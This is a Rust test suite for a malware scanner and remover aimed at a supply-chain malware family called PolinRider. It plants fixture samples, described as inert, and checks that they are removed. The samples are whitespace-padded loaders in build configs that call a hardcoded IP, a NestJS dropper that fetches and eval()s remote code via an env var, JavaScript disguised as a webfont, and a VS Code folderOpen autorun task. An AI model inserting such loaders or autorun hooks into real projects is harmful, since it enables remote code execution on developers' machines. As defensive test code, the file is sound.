//! End-to-end removal tests.
//!
//! Detector opt-out marker: POLINRIDER-HUNTER-DETECTOR
//!
//! The unit tests check the matcher. These check the thing that actually
//! matters: plant each real attack shape on disk, run the scanner and healer
//! over it, and assert both that the payload is gone *and* that the legitimate
//! code around it survived untouched.
//!
//! Every payload here is inert — it is the recognisable *shape* of PolinRider
//! with a harmless body, so the suite is safe to run and does not ship working
//! malware. Where the exact bytes matter (padding length, line endings) they are
//! reproduced faithfully.

use std::path::{Path, PathBuf};

use polinrider_hunter::{healer, scanner, signatures};

/// Point state (quarantine, log) at one directory for the whole test binary.
///
/// `POLINRIDER_HOME` is read from the process environment, and Rust runs tests
/// in parallel threads that share it - so setting it per-sandbox meant one
/// test's teardown could delete the quarantine another test was asserting on.
fn shared_home() -> PathBuf {
    use std::sync::OnceLock;
    static HOME: OnceLock<PathBuf> = OnceLock::new();
    HOME.get_or_init(|| {
        let p = std::env::temp_dir().join(format!("prh-test-home-{}", std::process::id()));
        std::fs::create_dir_all(&p).expect("create test home");
        std::env::set_var("POLINRIDER_HOME", &p);
        p
    })
    .clone()
}

/// A scratch directory unique to each test, cleaned up on drop.
struct Sandbox {
    root: PathBuf,
}

impl Sandbox {
    fn new(name: &str) -> Sandbox {
        // Nanosecond suffix so parallel tests never collide.
        let stamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        // Keep quarantine and log out of the user's real state directory.
        shared_home();
        let root = std::env::temp_dir().join(format!("prh-test-{name}-{stamp}"));
        std::fs::create_dir_all(&root).expect("create sandbox");
        Sandbox { root }
    }

    fn write(&self, rel: &str, bytes: &[u8]) -> PathBuf {
        let p = self.root.join(rel);
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent).expect("create parent");
        }
        std::fs::write(&p, bytes).expect("write fixture");
        p
    }

    fn read(&self, p: &Path) -> Vec<u8> {
        std::fs::read(p).expect("read back")
    }
}

impl Drop for Sandbox {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

/// Remove the shared state directory once the whole suite has finished.
///
/// Each run used to leave a populated quarantine in TEMP, and a later
/// machine-wide sweep would walk into it and "clean" the quarantined originals -
/// which is how one hunt produced several hundred bogus findings. The scanner
/// now skips any marked quarantine, but leaving litter behind was the first
/// mistake and this fixes that one.
/// Reclaim the state directories left by *earlier* runs.
///
/// The first attempt deleted this run's own home, from a test named to sort
/// last. Cargo runs tests in parallel, so "last" meant nothing: it removed the
/// quarantine while another test was still writing to it, and that test failed
/// with a missing path. Cleaning up only directories belonging to processes
/// that have finished is race-free by construction, and TEMP still never
/// accumulates more than the run in progress.
#[test]
fn zz_reclaim_state_directories_from_earlier_runs() {
    let mine = shared_home();
    let Some(parent) = mine.parent().map(Path::to_path_buf) else {
        return;
    };
    // Every directory this suite creates carries the test process id, and other
    // tests in *this* process are very likely still using theirs - deleting one
    // mid-test is what the previous version of this cleanup did. Skip anything
    // tagged with our own pid; what remains belongs to a run that has finished.
    let mine_tag = format!("-{}", std::process::id());
    let mut reclaimed = 0;
    if let Ok(entries) = std::fs::read_dir(&parent) {
        for e in entries.flatten() {
            let name = e.file_name();
            let Some(text) = name.to_str() else { continue };
            if !(text.starts_with("prh-test-home-") || text.starts_with("prh-live-")) {
                continue;
            }
            if text.ends_with(&mine_tag) || text.contains(&format!("{mine_tag}-")) {
                continue;
            }
            if std::fs::remove_dir_all(e.path()).is_ok() {
                reclaimed += 1;
            }
        }
    }
    // Nothing to assert about the count - a first run finds none. This exists
    // for its effect, and the assertion is only that it did not blow up.
    assert!(reclaimed < usize::MAX);
}

/// The camouflage every sample uses: enough whitespace to push the payload off
/// the right-hand edge of an editor.
fn pad(n: usize, tabs: bool) -> Vec<u8> {
    std::iter::repeat(if tabs { b'\t' } else { b' ' })
        .take(n)
        .collect()
}

/// Scan one file and heal it, returning the outcome.
fn clean_one(path: &Path) -> healer::Outcome {
    let finding = scanner::scan_file(path).expect("scanner should flag this file");
    assert!(
        finding.is_critical(),
        "expected a critical finding for {}, got {:?}",
        path.display(),
        finding.hits.iter().map(|h| h.ioc).collect::<Vec<_>>()
    );
    healer::heal(&finding, false)
}

fn assert_healed(outcome: &healer::Outcome) {
    assert!(
        matches!(outcome, healer::Outcome::Healed { .. }),
        "expected a heal, got {}",
        outcome.label()
    );
}

// ---------------------------------------------------------------------------
// Shape 1: payload appended to a build config behind a whitespace pad.
// This is the common case, and the variant that evaded every previous gate.
// ---------------------------------------------------------------------------

#[test]
fn spaced_variant_in_postcss_config_crlf() {
    let sb = Sandbox::new("postcss-crlf");
    let mut body = b"import { createRequire } from 'module';\r\n\r\nexport default config;".to_vec();
    body.extend(pad(500, false));
    body.extend_from_slice(
        b"global.i = 'A8-2941';const h=require('node:http');h.request('http://1.2.3.4:443/0x/cls')\r\n",
    );
    let p = sb.write("postcss.config.mjs", &body);

    assert_healed(&clean_one(&p));

    let after = sb.read(&p);
    // The `createRequire` shim goes too: `.mjs` is ESM and has no `require()`,
    // so the loader injects one for its payload. Removing the payload but
    // leaving the scaffolding is how a "cleaned" file ends up still differing
    // from the pristine original - which is exactly what was observed on three
    // real repositories.
    assert_eq!(
        after, b"export default config;\r\n",
        "payload and its scaffolding must both go, leaving the original"
    );
    assert!(!signatures::has_critical(&after));
    // CRLF preserved: the surviving line keeps the file's own ending.
    assert_eq!(after.windows(2).filter(|w| *w == b"\r\n").count(), 1);
}

#[test]
fn tab_padded_variant_in_tailwind_config_lf() {
    let sb = Sandbox::new("tailwind-lf");
    let mut body = b"module.exports = {\n  plugins: [],\n};".to_vec();
    body.extend(pad(300, true));
    body.extend_from_slice(b"global.i='A9-4221';parseInt(_0xdeadbe)\n");
    let p = sb.write("tailwind.config.js", &body);

    assert_healed(&clean_one(&p));
    assert_eq!(sb.read(&p), b"module.exports = {\n  plugins: [],\n};\n");
}

#[test]
fn obfuscated_variant_in_eslint_config() {
    let sb = Sandbox::new("eslint-obf");
    let mut body = b"export default defineConfig([\n  {},\n]);".to_vec();
    body.extend(pad(480, false));
    body.extend_from_slice(b"global['!']='8-2941';var _$_1e42=function(l,e){return 4573868};\n");
    let p = sb.write("eslint.config.mjs", &body);

    assert_healed(&clean_one(&p));
    assert_eq!(sb.read(&p), b"export default defineConfig([\n  {},\n]);\n");
}

#[test]
fn payload_with_no_trailing_newline() {
    let sb = Sandbox::new("no-eol");
    let mut body = b"export default config;".to_vec();
    body.extend(pad(250, false));
    body.extend_from_slice(b"global.i = 'A8-1111';x()");
    let p = sb.write("postcss.config.mjs", &body);

    assert_healed(&clean_one(&p));
    assert_eq!(sb.read(&p), b"export default config;");
}

// ---------------------------------------------------------------------------
// Shape 2: the NestJS dropper in src/main.ts, plus its .env
// ---------------------------------------------------------------------------

#[test]
fn nestjs_dropper_is_excised_leaving_the_app_intact() {
    let sb = Sandbox::new("nest-main");
    let body = br#"import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  await app.listen(3000);
}
bootstrap();
"#;
    let p = sb.write("src/main.ts", body);

    assert_healed(&clean_one(&p));

    let after = String::from_utf8(sb.read(&p)).unwrap();
    // The payload and its injected import are gone...
    assert!(!after.contains("AUTH_API_KEY"));
    assert!(!after.contains("eval(proxyInfo)"));
    assert!(!after.contains("dotenv/config"));
    // ...and the application still boots.
    assert!(after.contains("import { NestFactory }"));
    assert!(after.contains("async function bootstrap()"));
    assert!(after.contains("await app.listen(3000)"));
    assert!(!signatures::has_critical(after.as_bytes()));
}

#[test]
fn dropped_env_holding_only_the_key_is_deleted() {
    let sb = Sandbox::new("env-drop");
    let p = sb.write(".env", b"AUTH_API_KEY=aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvYXBp\n");

    let outcome = clean_one(&p);
    assert!(
        matches!(outcome, healer::Outcome::Deleted),
        "expected deletion, got {}",
        outcome.label()
    );
    assert!(!p.exists(), "the dropper file must be gone");
}

#[test]
fn a_real_env_that_picked_up_the_key_is_never_destroyed() {
    let sb = Sandbox::new("env-real");
    let p = sb.write(
        ".env",
        b"DATABASE_URL=postgres://user:pw@localhost/db\nSTRIPE_KEY=sk_test_realvalue\nAUTH_API_KEY=aHR0cA==\n",
    );

    let finding = scanner::scan_file(&p).expect("should be flagged");
    let outcome = healer::heal(&finding, false);
    assert!(
        !matches!(outcome, healer::Outcome::Deleted),
        "a .env with genuine secrets must not be deleted wholesale"
    );
    assert!(p.exists(), "the file must still exist");
    let after = String::from_utf8(sb.read(&p)).unwrap();
    assert!(
        after.contains("STRIPE_KEY=sk_test_realvalue"),
        "real secrets must survive"
    );
}

// ---------------------------------------------------------------------------
// Shape 3: the payload disguised as a webfont
// ---------------------------------------------------------------------------

#[test]
fn javascript_disguised_as_a_webfont_is_deleted() {
    let sb = Sandbox::new("font-disguise");
    let p = sb.write(
        "public/fonts/fa-solid-400.woff2",
        b"const http = require('node:http');\nmodule.exports = function(){ return process.pid; };\n",
    );

    let outcome = clean_one(&p);
    assert!(
        matches!(outcome, healer::Outcome::Deleted),
        "expected deletion, got {}",
        outcome.label()
    );
    assert!(!p.exists());
}

#[test]
fn a_genuine_webfont_is_not_touched() {
    let sb = Sandbox::new("font-real");
    // wOF2 magic, then binary that happens to contain code-ish words.
    let mut font = b"wOF2".to_vec();
    font.extend_from_slice(&[0u8, 1, 0, 0, 0, 0]);
    font.extend_from_slice(b"function require global module process.");
    let p = sb.write("public/fonts/real.woff2", &font);

    assert!(
        scanner::scan_file(&p).is_none(),
        "a real font must not be flagged"
    );
    assert!(p.exists());
}

// ---------------------------------------------------------------------------
// Shape 4: the VS Code autorun variant
// ---------------------------------------------------------------------------

#[test]
fn autorun_tasks_json_is_reported_but_never_silently_rewritten() {
    let sb = Sandbox::new("tasks-autorun");
    // The arming half of the autorun variant: a task that fires on folderOpen
    // and runs the payload that is disguised as a webfont.
    let body = br#"{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "fonts",
      "type": "shell",
      "command": "node ./public/fonts/fa-solid-400.woff2",
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
"#;
    let p = sb.write(".vscode/tasks.json", body);

    let finding = scanner::scan_file(&p).expect("must be flagged");
    assert!(finding.is_critical(), "the font-payload command is unambiguous");

    // Editing JSON by splicing bytes would risk corrupting a real config, so
    // the healer must decline and say so rather than guess.
    let outcome = healer::heal(&finding, false);
    assert!(
        matches!(outcome, healer::Outcome::Failed(_) | healer::Outcome::Skipped(_)),
        "must not auto-edit tasks.json, got {}",
        outcome.label()
    );
    assert_eq!(
        sb.read(&p),
        body.to_vec(),
        "the file must be left exactly as it was for the user to fix"
    );
}

#[test]
fn a_reinfected_config_is_cleaned_completely() {
    let sb = Sandbox::new("reinfected");
    // Two visits, two pads, two payloads.
    let mut body = b"module.exports = { plugins: [] };".to_vec();
    body.extend(pad(320, false));
    body.extend_from_slice(b"global.i = 'A8-1111';first()\n");
    body.extend_from_slice(b"const keep = true;");
    body.extend(pad(320, true));
    body.extend_from_slice(b"global['!']='8-2';var _$_1e42=4573868;\n");
    let p = sb.write("tailwind.config.js", &body);

    assert_healed(&clean_one(&p));
    let after = String::from_utf8(sb.read(&p)).unwrap();
    assert!(!signatures::has_critical(after.as_bytes()), "still dirty:\n{after}");
    assert!(after.contains("module.exports = { plugins: [] };"));
    assert!(after.contains("const keep = true;"));
    // A second pass has nothing left to do.
    assert!(scanner::scan_file(&p).is_none());
}

// ---------------------------------------------------------------------------
// Directory-level behaviour: does a sweep find everything at once?
// ---------------------------------------------------------------------------

#[test]
fn a_sweep_finds_every_shape_and_leaves_clean_files_alone() {
    let sb = Sandbox::new("sweep");

    let mut cfg = b"export default {};".to_vec();
    cfg.extend(pad(400, false));
    cfg.extend_from_slice(b"global.i = 'A8-2941';go()\n");
    sb.write("app/postcss.config.mjs", &cfg);

    let mut tw = b"module.exports = {};".to_vec();
    tw.extend(pad(400, true));
    tw.extend_from_slice(b"global['!']='8-1';_$_1e42\n");
    sb.write("web/tailwind.config.js", &tw);

    sb.write("api/.env", b"AUTH_API_KEY=aHR0cA==\n");
    sb.write(
        "web/public/fonts/icons.woff2",
        b"require('node:http'); module.exports = () => {};",
    );

    // Innocent bystanders that must not be reported.
    sb.write(
        "web/postcss.config.js",
        b"module.exports = { plugins: { tailwindcss: {} } };\n",
    );
    sb.write("README.md", b"| col | col |\n|-----|-----|\n| a   | b   |\n");
    sb.write("scripts/dev.cjs", b"spawn('node', ['x'], { windowsHide: true });\n");

    let findings = scanner::scan_tree(&sb.root, false);
    let critical: Vec<_> = findings.iter().filter(|f| f.is_critical()).collect();
    assert_eq!(
        critical.len(),
        4,
        "expected exactly the four planted infections, got: {:?}",
        findings
            .iter()
            .map(|f| (f.path.file_name().unwrap().to_string_lossy().into_owned(), f.is_critical()))
            .collect::<Vec<_>>()
    );

    for f in &critical {
        let outcome = healer::heal(f, false);
        assert!(
            matches!(
                outcome,
                healer::Outcome::Healed { .. } | healer::Outcome::Deleted
            ),
            "{} -> {}",
            f.path.display(),
            outcome.label()
        );
    }

    // Second pass must be silent: removal has to be complete, not partial.
    let after: Vec<_> = scanner::scan_tree(&sb.root, false)
        .into_iter()
        .filter(|f| f.is_critical())
        .collect();
    assert!(
        after.is_empty(),
        "still infected after cleaning: {:?}",
        after.iter().map(|f| f.path.display().to_string()).collect::<Vec<_>>()
    );

    // The clean config was never rewritten.
    assert_eq!(
        std::fs::read(sb.root.join("web/postcss.config.js")).unwrap(),
        b"module.exports = { plugins: { tailwindcss: {} } };\n"
    );
}

#[test]
fn originals_are_recoverable_from_quarantine() {
    let sb = Sandbox::new("quarantine");
    let mut body = b"export default {};".to_vec();
    body.extend(pad(300, false));
    body.extend_from_slice(b"global.i = 'A8-2941';x()\n");
    let original = body.clone();
    let p = sb.write("postcss.config.mjs", &body);

    assert_healed(&clean_one(&p));

    // The index records where the original went; it must still be byte-identical.
    // Other tests write to the same index, so match on our own path rather than
    // assuming we wrote the final line.
    let index = polinrider_hunter::config::quarantine_index();
    let text = std::fs::read_to_string(&index).expect("quarantine index should exist");
    let want = json_escape_path(&p);
    let line = text
        .lines()
        .find(|l| l.contains(&format!("\"original\":\"{want}\"")))
        .unwrap_or_else(|| panic!("no quarantine entry for {}", p.display()));
    let saved = PathBuf::from(unescape(extract_field(line, "quarantined")));
    assert_eq!(
        std::fs::read(&saved).expect("quarantined copy readable"),
        original,
        "the quarantined original must match what was on disk"
    );
}

/// Path as it appears inside the index (backslashes doubled).
fn json_escape_path(p: &Path) -> String {
    p.to_string_lossy().replace('\\', "\\\\")
}

fn extract_field<'a>(line: &'a str, field: &str) -> &'a str {
    let key = format!("\"{field}\":\"");
    let start = line.find(&key).expect("field present") + key.len();
    let rest = &line[start..];
    // Values are paths: no escaped quotes to worry about, only doubled slashes.
    let end = rest.find('"').expect("closing quote");
    &rest[..end]
}

fn unescape(s: &str) -> String {
    s.replace("\\\\", "\\")
}

// ---------------------------------------------------------------------------
// Idempotence and safety
// ---------------------------------------------------------------------------

#[test]
fn cleaning_is_idempotent() {
    let sb = Sandbox::new("idempotent");
    let mut body = b"export default {};".to_vec();
    body.extend(pad(300, false));
    body.extend_from_slice(b"global.i = 'A8-2941';x()\n");
    let p = sb.write("postcss.config.mjs", &body);

    assert_healed(&clean_one(&p));
    let once = sb.read(&p);
    // Nothing left to find, so nothing left to change.
    assert!(scanner::scan_file(&p).is_none());
    assert_eq!(sb.read(&p), once);
}

#[test]
fn a_dry_run_changes_nothing() {
    let sb = Sandbox::new("dry-run");
    let mut body = b"export default {};".to_vec();
    body.extend(pad(300, false));
    body.extend_from_slice(b"global.i = 'A8-2941';x()\n");
    let p = sb.write("postcss.config.mjs", &body);
    let before = sb.read(&p);

    let finding = scanner::scan_file(&p).unwrap();
    let outcome = healer::heal(&finding, true);
    assert!(matches!(outcome, healer::Outcome::Skipped(_)));
    assert_eq!(sb.read(&p), before, "--dry-run must not write");
}

#[test]
fn a_detector_file_is_never_healed() {
    let sb = Sandbox::new("detector");
    // A gate file: signatures inside a grep pattern, plus the marker.
    let body = b"# POLINRIDER-HUNTER-DETECTOR\nPATTERN=\"AUTH_API_KEY|global.i=\"\ngrep -rE \"$PATTERN\" src\n";
    let p = sb.write("scan-gate.sh", body);
    assert!(
        scanner::scan_file(&p).is_none(),
        "a declared detector must be exempt"
    );
    assert_eq!(sb.read(&p), body);
}

// ---------------------------------------------------------------------------
// The guard lifecycle, exercised through the real binary.
//
// Every bug in this area reached a user: `install` reporting a guard that had
// already exited, a re-install failing because the running guard held the
// executable open, `stop` claiming nothing was running when the kill had in
// fact been refused. None of those are visible from a unit test of the matcher,
// so they are driven here through the compiled command line.
// ---------------------------------------------------------------------------

/// The binary under test, as cargo built it next to the test executable.
fn hunter_bin() -> PathBuf {
    let mut p = std::env::current_exe().expect("test exe path");
    p.pop(); // deps/
    if p.ends_with("deps") {
        p.pop();
    }
    p.join(format!("polinrider-hunter{}", std::env::consts::EXE_SUFFIX))
}

/// Run the binary with its state pointed at a private home.
fn run_hunter(home: &Path, args: &[&str]) -> (i32, String) {
    let out = std::process::Command::new(hunter_bin())
        .args(args)
        .arg("--no-color")
        .env("POLINRIDER_HOME", home)
        .output()
        .expect("run polinrider-hunter");
    let mut text = String::from_utf8_lossy(&out.stdout).into_owned();
    text.push_str(&String::from_utf8_lossy(&out.stderr));
    (out.status.code().unwrap_or(-1), text)
}

/// A state directory of its own, so these never touch the real installation.
fn private_home(tag: &str) -> PathBuf {
    let p = std::env::temp_dir().join(format!(
        "prh-live-{tag}-{}-{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    std::fs::create_dir_all(&p).expect("create private home");
    p
}

#[test]
fn stop_says_so_plainly_when_no_guard_is_running() {
    let home = private_home("stop-idle");
    let (code, out) = run_hunter(&home, &["stop"]);
    assert_eq!(code, 0, "stopping nothing is not an error:\n{out}");
    assert!(
        out.contains("no guard was running"),
        "expected a plain statement, got:\n{out}"
    );
    let _ = std::fs::remove_dir_all(&home);
}

#[test]
fn a_guard_publishes_its_heartbeat_before_it_does_any_work() {
    // The regression this pins: the heartbeat used to be written at the top of
    // the scan loop, after a priority shell-out that takes seconds. In that gap
    // `install` could not tell a live guard from a dead one, and a second
    // install would start a rival.
    let home = private_home("heartbeat");
    let project = home.join("watched");
    std::fs::create_dir_all(&project).unwrap();
    // A guard with nothing configured exits immediately, and rightly so.
    std::fs::write(
        home.join("config.txt"),
        format!("path = {}
", project.display()),
    )
    .unwrap();

    let mut child = std::process::Command::new(hunter_bin())
        .args(["daemon"])
        .env("POLINRIDER_HOME", &home)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .expect("spawn guard");

    let beat = home.join("daemon.heartbeat");
    let mut appeared = false;
    for _ in 0..40 {
        if beat.exists() {
            appeared = true;
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    let recorded = std::fs::read_to_string(&beat).unwrap_or_default();
    let _ = child.kill();
    let _ = child.wait();
    let _ = std::fs::remove_dir_all(&home);

    assert!(appeared, "no heartbeat within 4s of the guard starting");
    let pid: u32 = recorded
        .split_whitespace()
        .next()
        .and_then(|p| p.parse().ok())
        .expect("heartbeat starts with a pid");
    assert_eq!(pid, child.id(), "the heartbeat names the wrong process");
}

#[test]
fn monitor_reports_a_snapshot_without_a_guard_or_a_checkout() {
    // "Make it work without cloning the repo": the dashboard is part of the
    // binary, so it must answer from any directory with no project present.
    let home = private_home("monitor");
    let (code, out) = run_hunter(&home, &["monitor", "--once"]);
    assert_eq!(code, 0, "monitor should not fail on an idle install:\n{out}");
    for expected in ["guard", "cleaned", "quarantined"] {
        assert!(
            out.contains(expected),
            "snapshot is missing {expected:?}:\n{out}"
        );
    }
    let _ = std::fs::remove_dir_all(&home);
}

#[test]
fn monitor_json_is_parseable_and_reports_the_guard_as_down() {
    let home = private_home("monitor-json");
    let (code, out) = run_hunter(&home, &["monitor", "--once", "--json"]);
    assert_eq!(code, 0, "monitor --json failed:\n{out}");
    let json = out.trim();
    assert!(json.starts_with('{') && json.ends_with('}'), "not JSON:\n{out}");
    assert!(
        json.contains("\"running\":false"),
        "no guard is running, so it should say so:\n{out}"
    );
    // The counts a dashboard renders must always be present, even at zero -
    // a missing key renders as "undefined", which reads like a broken page.
    for key in ["\"cleaned\"", "\"review\"", "\"quarantined\"", "\"paths\""] {
        assert!(json.contains(key), "missing {key} in:\n{json}");
    }
    let _ = std::fs::remove_dir_all(&home);
}

#[test]
fn a_one_shot_sweep_never_claims_the_guard_heartbeat() {
    // `install` runs a sweep in its own process before starting the guard. That
    // sweep used to publish a heartbeat under the installer's pid, so install
    // read its own sweep back as a guard that was already running - and the
    // guard it then spawned could see the same beat, decide the lock was taken
    // and exit, leaving the machine unwatched while install reported success.
    let home = private_home("oneshot");
    let project = home.join("watched");
    std::fs::create_dir_all(&project).unwrap();
    std::fs::write(project.join("index.js"), b"export const a = 1;\n").unwrap();

    let (code, out) = run_hunter(&home, &["clean", project.to_str().unwrap()]);
    assert_eq!(code, 0, "a clean tree should exit 0:\n{out}");
    assert!(
        !home.join("daemon.heartbeat").exists(),
        "a one-shot run left a heartbeat behind, which reads as a live guard"
    );

    let (_, status) = run_hunter(&home, &["status"]);
    assert!(
        status.contains("not running"),
        "status should not claim a guard after a one-shot run:\n{status}"
    );
    let _ = std::fs::remove_dir_all(&home);
}

#[test]
fn install_does_not_hold_the_terminal_open_after_it_finishes() {
    // The guard is spawned detached, but on Windows a new process inherits every
    // inheritable handle - including the pipe a shell gives us for stdout when
    // the command is part of a pipeline, which the one-line installer always is.
    // The shell then waits for every writer to close, so `install` appeared to
    // hang forever even though it had finished and the guard was running.
    //
    // Reading the child's stdout to end-of-file is exactly what a shell does, so
    // this reproduces it: if the handle leaks, the read never returns.
    let home = private_home("pipe");
    let project = home.join("watched");
    std::fs::create_dir_all(&project).unwrap();
    std::fs::write(project.join("index.js"), b"export const a = 1;\n").unwrap();

    let mut child = std::process::Command::new(hunter_bin())
        .args(["install", project.to_str().unwrap(), "--no-autostart", "--no-color"])
        .env("POLINRIDER_HOME", &home)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .spawn()
        .expect("spawn install");

    let mut out = child.stdout.take().expect("piped stdout");
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        use std::io::Read;
        let mut buf = String::new();
        let _ = out.read_to_string(&mut buf);
        let _ = tx.send(buf);
    });

    let text = rx.recv_timeout(std::time::Duration::from_secs(60));
    let _ = child.wait();

    // Whatever happened, do not leave a guard running for the next test.
    let (_, _) = run_hunter(&home, &["stop"]);
    let leaked = text.is_err();
    let text = text.unwrap_or_default();
    let _ = std::fs::remove_dir_all(&home);

    assert!(
        !leaked,
        "stdout never reached end-of-file: the guard inherited the pipe and \
         would hang the caller's terminal"
    );
    assert!(
        text.contains("guard running in background"),
        "install should report a live guard:\n{text}"
    );
}
